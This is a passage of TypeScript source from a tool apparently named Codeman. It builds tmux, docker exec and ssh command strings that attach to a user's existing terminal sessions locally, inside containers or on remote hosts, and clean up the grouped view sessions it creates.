  // Our own leftover view from a previous adoption of the same Codeman session.
  const dropStaleView = `tmux -S ${sock} kill-session -t ${fshq(`=${target.viewSession}`)} 2>/dev/null || true`;
  const group =
    `exec tmux -u -S ${sock} new-session -t ${t} -s ${v} \\; ` +
    `set-option -t ${v} destroy-unattached on \\; ` +
    `set-option -t ${v} status off`;
  return `${tmuxCheck} ; ${guard} ; ${dropStaleView} ; ${group}`;
}

/** Local adoption: run the invocation directly in the wrapper pane. */
export function buildForeignAttachCommand(target: ForeignAttachTarget): string {
  return buildForeignTmuxInvocation(target);
}

export interface ForeignDockerAttachOptions extends ForeignAttachTarget {
  /** `buildDockerBaseArgs(...)` joined, e.g. `docker` or `docker --context foo`. */
  dockerBase: string;
  containerName: string;
}

/**
 * Docker adoption: `docker exec -it` into the container and attach there.
 *
 * Mirrors the ADOPTED-container branch of `buildDockerLaunchCommand`: look, then
 * exec. Never `create`, never `start`: the container belongs to the user, and a
 * missing or stopped one fails closed with a message instead of being mutated.
 */
export function buildForeignDockerAttachCommand(opts: ForeignDockerAttachOptions): string {
  const name = fshq(opts.containerName);
  const notFound = fshq(
    `Codeman: container ${opts.containerName} not found. Codeman never creates a container it does not own.`
  );
  const notRunning = fshq(
    `Codeman: container ${opts.containerName} is not running. Codeman never starts a container it does not own.`
  );
  const inspect = `${opts.dockerBase} inspect ${name} >/dev/null 2>&1 || { echo ${notFound}; exit 1; }`;
  const running =
    `${opts.dockerBase} inspect -f ${fshq('{{.State.Running}}')} ${name} 2>/dev/null | grep -qx true ` +
    `|| { echo ${notRunning}; exit 1; }`;
  // The same terminal `resolveDockerLaunchOptions` gives an owned container's exec:
  // `docker exec -it` defaults to TERM=xterm, which holds the tab to 8 colours.
  const terminal = '-e TERM=xterm-256color -e COLORTERM=truecolor';
  const exec = `exec ${opts.dockerBase} exec -it ${terminal} ${name} sh -lc ${fshq(buildForeignTmuxInvocation(opts))}`;
  return [inspect, running, exec].join(' ; ');
}

/**
 * Tear down OUR grouped view session inside a container.
 *
 * ⚠️ Needed for docker and NOT for the other two, which is a docker fact rather
 * than a design choice. Killing the wrapper pane kills a LOCAL tmux client
 * directly, and over ssh it sends SIGHUP to the remote client (the same
 * propagation the non-owned remote attach has relied on since COD-105), either
 * way the client detaches and `destroy-unattached on` collects the view.
 * A `docker exec` process does NOT die when its client goes away: measured, the
 * in-container tmux client stayed attached after the wrapper was killed, so the
 * view session survived forever and every adoption leaked one of them plus its
 * exec process.
 *
 * Killing a session by name affects ONLY that session, never the group's other
 * members, so this can only ever remove the view Codeman created, never the
 * human's session it is grouped with. Sibling of `buildDockerKillCommand`, and
 * fired best-effort on the same path.
 */
export function buildForeignDockerViewKillCommand(opts: {
  dockerBase: string;
  containerName: string;
  socketPath: string;
  viewSession: string;
}): string {
  return (
    `${opts.dockerBase} exec ${fshq(opts.containerName)} ` +
    `tmux -S ${fshq(opts.socketPath)} kill-session -t ${fshq(`=${opts.viewSession}`)}`
  );
}

/**
 * A POSIX script as the command line of an ssh connection.
 *
 * ssh hands its command to the remote user's LOGIN shell, which may be fish: the
 * guard chain's `{ ...; }` and the probe's `${VAR:-x}` are POSIX, so they run in an
 * explicit `sh`. The PATH line stays outside it because it is the part written for
 * whatever that shell is (`withRemoteTmuxPath`), and sshd's non-interactive PATH can
 * miss a Homebrew or per-user tmux, the same reason every other remote tmux call has
 * it. Single-quote-free input stays single-quote-free here, and `exec` keeps the
 * process tree one level shorter.
 */
export function foreignRemoteShellCommand(script: string): string {
  return withRemoteTmuxPath(`exec sh -c ${fshq(script)}`);
}

export interface ForeignRemoteAttachOptions extends ForeignAttachTarget {
  /** `buildSshConnectionArgs(host)`: `['ssh', '-o BatchMode=yes', ...]`. */
  sshArgs: string[];
  /** `remoteSshTarget(host)`: `user@host`. */
  sshTarget: string;
}

/**
 * Remote adoption: ssh in and attach there.
 *
 * `-t` goes right after `ssh -o BatchMode=yes`, exactly where
 * `buildRemoteAttachCommand` puts it: interactive tmux needs a PTY. Connection
 * options come from the shared `buildSshConnectionArgs`, never hand-built here,
 * so adoption reaches a proxied/custom-port host on the same terms discovery did.
 */
export function buildForeignRemoteAttachCommand(opts: ForeignRemoteAttachOptions): string {
  const [ssh, batchMode, ...rest] = opts.sshArgs;
  return [
    ssh,
    batchMode,
    '-t',
    ...rest,
    opts.sshTarget,
    fshq(foreignRemoteShellCommand(buildForeignTmuxInvocation(opts))),
  ]
    .filter(Boolean)
    .join(' ');
}
